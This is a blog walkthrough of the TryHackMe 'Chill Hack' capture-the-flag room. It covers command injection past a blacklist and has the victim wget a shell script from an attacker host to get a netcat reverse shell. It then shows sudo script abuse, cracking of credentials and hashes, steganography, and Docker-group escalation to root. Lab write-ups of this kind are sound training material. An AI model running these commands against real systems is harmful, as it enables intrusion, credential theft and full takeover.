---
layout: post
author: Marcus Loeper
---

# THM - Chill Hack

![image](/images/Pasted image 20221023210259.png)
[Try Hack Me - Chill Hack](https://tryhackme.com/room/chillhack)

## Enumeration

### nmap scan

```shell
sudo nmap -sS -p- -oN chillhack.nmap chillhack.thm
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-17 16:16 EDT
Nmap scan report for chillhack.thm (10.10.195.247)
Host is up (0.042s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

i found 3 open ports. lets see what the website is all about.

![image](/images/Pasted image 20221017221742.png)

nothing special. lets see if we find any directories.

### Dirbusting with ffuf

```shell
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://chillhack.thm/FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://chillhack.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3424ms]
css                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 37ms]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3880ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3889ms]
fonts                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 36ms]
images                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 39ms]
index.html              [Status: 200, Size: 35184, Words: 16992, Lines: 644, Duration: 37ms]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 37ms]
secret                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 41ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 38ms]
:: Progress: [4712/4712] :: Job [1/1] :: 1075 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

after dirbusting with ffuf one directory got my attention. `secret`

![image](/images/Pasted image 20221017222347.png)

just a site with an input field and one button.
i tried `whoami` and got a positive answer.

![image](/images/Pasted image 20221017222519.png)

but a some commands are blacklisted.

![image](/images/Pasted image 20221017222613.png)

I tried different commands to view the contents of a file and in the end `nl` was one that worked.

because `ls` is not working i used `find` to look for files.

![image](/images/Pasted image 20221017223746.png)

but i could not read the `local.txt`. bash was of course black listed too and other tools like python also. i wanted to spawn a reverse shell and luckily i could use `wget` to download the shell script to the victim. i also moved to `curl` for faster iteration.

```shell
$ curl -L -d "command=wget --version" http://chillhack.thm/secret/
<html>
<body>

<form method="POST">
        <input id="comm" type="text" name="command" placeholder="Command">
        <button>Execute</button>
</form>
<h2 style="color:blue;">GNU Wget 1.19.4 built on linux-gnu.

-cares +digest -gpgme +https +ipv6 +iri +large-file -metalink +nls
+ntlm +opie +psl +ssl/openssl
</h2>
                        <style>
                             body
                             {
                                   background-image: url('images/blue_boy_typing_nothought.gif');
                                   background-position: center center;
                                   background-repeat: no-repeat;
                                   background-attachment: fixed;
                                   background-size: cover;
}
                          </style>
        </body>
</html>
```

## reverse shell

on my machine i started a webserver,

```shell
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

and download the shell on the victim.

```shell
$ curl -L -d "command=wget -O /tmp/shell.sh http://<attacker-ip>/shell.sh" http://chillhack.thm/secret/
```

i had so set the the permissions numeric because `+x` was not working.

```shell
$ curl -L -d "command=chmod 777 /tmp/shell.sh" http://chillhack.thm/secret/
```

the i double checked the permissions via the `stat` which was not filtered.

```shell
$ curl -L -d "command=stat -c %A /tmp/shell.sh" http://chillhack.thm/secret/

<h2 style="color:blue;">-rwxrwxrwx
```

i launched the script and got a reverse shell on my kali box.

```shell
$ curl -L -d "command=/tmp/shell.sh" http://chillhack.thm/secret/
```

```shell
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.11.1.199] from (UNKNOWN) [10.10.55.124] 54700
bash: cannot set terminal process group (1066): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html/secret$
```

stabilize shell

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm

CTRL + Z
stty raw -echo; fg
```

## getting first user and user flag

to get the user flag i started with `sudo -l`.

```shell
www-data@ubuntu:/var/www$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh

```

we can execute a script as the user `apaar`
the content of the script:

```bash
www-data@ubuntu:/home/apaar$ cat .helpline.sh
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```

we can exploit this script very easily via typing `bash` as the message input.

```shell
www-data@ubuntu:/home/apaar$ sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: asd
Hello user! I am asd,  Please enter your message: bash
ls
local.txt
whoami
apaar
```

after stabilizing the shell i got the first flag.

![image](/images/Pasted image 20221019091841.png)

## further enumeration

after that i searched for the next attack vector. finally i looked into the web directory again and found a another folder. `files`

```shell
apaar@ubuntu:/var/www$ ls
files  html

apaar@ubuntu:/var/www/files$ ls
account.php  hacker.php  images  index.php  style.css
```

and reading the `index.php` file i found some credentials for a mysql database.

```php
con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");
```

looking through the database i found these password hashes.

```shell
mysql> select username, password from users;
+-----------+----------------------------------+
| username  | password                         |
+-----------+----------------------------------+
| Aurick    | 7e53614ced3640d5de23f111806cc4fd |
| cullapaar | 686216240e5af30df0501e53c789a649 |
+-----------+----------------------------------+
2 rows in set (0.00 sec)
```

i cracked the hashes with john quickly, but i got no luck with a valid login.

```shell
john --wordlist=/usr/share/wordlists/rockyou.txt --format=RAW-MD5 hashes.txt
```

```shell
Aurick - m************d
cullapaar - d*************l
```

so i searched further and found these lines in `hacker.php`

```html
<img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
        <h1 style="background-color:red;">You have reached this far. </h2>
        <h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
```

i downloaded the image via `python3 -m http.server 8000`
then i ran a few steg tools. in the end steghide was successful.

```shell
$ steghide extract -sf hacker-with-laptop_23-2147985341.jpg
Enter passphrase:
wrote extracted data to "backup.zip".
```

the zip needed a password.

```shell
$ unzip backup.zip
Archive:  backup.zip
[backup.zip] source_code.php password:
```

and `john` came again to the rescue.

```shell
$ zip2john backup.zip > backup_zip_hash.txt

$ john --wordlist=/usr/share/wordlists/rockyou.txt backup_zip_hash.txt
```

## getting second user login

the password worked and i got a new file `source-code.php`
in this file i found a base64 encoded password.

```php
password = $_POST["password"];
                if(base64_encode($password) == "IWQwbn************NzdzByZA==")
```

decoding with:

```shell
echo -n "IWQwbn************NzdzByZA==" | base64 -d
```

and for which account i could see a few lines further down.

```php
{
	echo "Welcome Anurodh!";
	header("Location: authenticated.php");
}
```

using these credentials i got a new login.
this user is a member of the `docker` group. with this info i escalate my privileges like this.

## root access

```shell
$ su anurodh
Password:
anurodh@ubuntu:/var/www/files$ id
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)

anurodh@ubuntu:/var/www/files$ docker image ls
REPOSITORY    TAG     IMAGE         ID  CREATED   SIZE
alpine        latest  a24bb4013296  2   years ago 5.57MB
hello-world   latest  bf756fb1ae65  2   years ago 13.3kB

anurodh@ubuntu:/var/www/files$ docker run -v /root/:/mnt -it alpine
/ # ls
bin etc lib mnt proc run sry tmp var
dev home media opt root sbin sys usr
/ # cd mnt
/mnt # ls
proof.txt
/mnt # cat proof.txt 
```

and here is the root flag.

![image](/images/Pasted image 20221019094035.png)
